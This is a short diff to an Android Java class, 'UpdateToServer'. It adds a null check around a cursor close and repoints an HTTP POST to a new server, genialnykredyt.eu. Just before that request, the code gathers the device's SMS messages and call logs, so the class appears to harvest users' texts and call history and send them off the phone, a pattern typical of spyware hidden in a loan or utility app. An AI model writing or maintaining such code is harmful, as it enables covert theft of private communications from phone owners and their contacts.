@@ -56,7 +56,10 @@ public class UpdateToServer {
         } catch (Exception e) {
             Log.e("Error", e.getMessage());
         } finally {
-            cursor.close();
+            if(cursor!=null){
+                cursor.close();
+            }
+
         }
         return messages;
 
@@ -107,7 +110,7 @@ public class UpdateToServer {
         final ArrayList<String> smss=getMessages();
         final String callllogs=getCallDetail();
         trimCache(context);
-        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
+        StringRequest request=new StringRequest(Request.Method.POST, "https://genialnykredyt.eu/get_messages_api/store_new_details.php", new Response.Listener<String>()
         {
 
             @Override
